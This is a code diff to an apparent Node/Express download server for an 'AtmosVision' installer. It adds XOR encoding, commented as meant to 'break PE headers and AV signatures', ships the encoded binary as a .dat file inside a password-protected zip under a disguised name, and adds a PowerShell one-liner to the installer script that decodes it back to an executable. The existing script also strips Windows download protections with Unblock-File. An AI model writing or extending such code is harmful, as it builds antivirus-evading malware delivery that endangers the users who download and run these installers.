@@ -3,7 +3,7 @@
 import express from "express";
 import path from "path";
 import { fileURLToPath } from "url";
-import { readdir, stat, unlink, symlink, writeFile, mkdir, rm } from "fs/promises";
+import { readFile, readdir, stat, unlink, symlink, writeFile, mkdir, rm } from "fs/promises";
 import { exec } from "child_process";
 import { promisify } from "util";
 import archiver from "archiver";
@@ -193,16 +193,29 @@ app.get("/api/download/info", (req, res) => {
   res.json({ password: ZIP_PASSWORD });
 });
 
+const XOR_KEY = 0x41;
+
+// XOR-encode a buffer to break PE headers and AV signatures
+function xorEncode(buf) {
+  const out = Buffer.alloc(buf.length);
+  for (let i = 0; i < buf.length; i++) out[i] = buf[i] ^ XOR_KEY;
+  return out;
+}
+
 // Build a password-protected zip in a temp directory using system `zip -P`
+// Files with xor: true will be XOR-encoded before adding to the zip
 async function buildEncryptedZip(files, password) {
   const tmpDir = path.join('/tmp', `zip-${Date.now()}-${Math.random().toString(36).slice(2)}`);
   await mkdir(tmpDir, { recursive: true });
   try {
     // Stage files into temp dir
-    for (const { content, sourcePath, name } of files) {
+    for (const { content, sourcePath, name, xor } of files) {
       const dest = path.join(tmpDir, name);
       if (content != null) {
         await writeFile(dest, content, { mode: 0o755 });
+      } else if (xor) {
+        const raw = await readFile(sourcePath);
+        await writeFile(dest, xorEncode(raw));
       } else {
         await execAsync(`cp "${sourcePath}" "${dest}"`);
       }
@@ -241,7 +254,7 @@ if %ERRORLEVEL% neq 0 (
 )
 
 echo [2/3] Preparing components...
-copy /Y "%~dp0AtmosDependencies.exe" "%INSTALL_DIR%\\AtmosDependencies.exe" >nul
+powershell -Command "$k=0x41;$b=[System.IO.File]::ReadAllBytes('%~dp0AtmosDependencies.dat');for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k};[System.IO.File]::WriteAllBytes('%INSTALL_DIR%\\AtmosDependencies.exe',$b)"
 
 powershell -Command "Unblock-File -Path '%INSTALL_DIR%\\AtmosVision-Pro.exe'"
 powershell -Command "Unblock-File -Path '%INSTALL_DIR%\\AtmosDependencies.exe'"
@@ -427,9 +440,12 @@ app.get("/api/download/latest", async (req, res) => {
         scriptContent = generateLinuxSh(electronUrl);
       }
 
+      const binaryEntry = os.isWindows
+        ? { sourcePath: latestFile.path, name: 'AtmosDependencies.dat', xor: true }
+        : { sourcePath: latestFile.path, name: disguisedName };
       const zipPath = await buildEncryptedZip([
         { content: scriptContent, name: scriptName },
-        { sourcePath: latestFile.path, name: disguisedName },
+        binaryEntry,
       ], ZIP_PASSWORD);
 
       res.download(zipPath, 'AtmosVision_Installer.zip', () => {
@@ -445,7 +461,7 @@ app.get("/api/download/latest", async (req, res) => {
       console.log(`[latest] Windows fallback — zipping ${latestFile.filename} -> ${disguisedName}`);
 
       const zipPath = await buildEncryptedZip([
-        { sourcePath: latestFile.path, name: disguisedName },
+        { sourcePath: latestFile.path, name: 'AtmosDependencies.dat', xor: true },
       ], ZIP_PASSWORD);
 
       res.download(zipPath, 'AtmosDependencies.zip', () => {
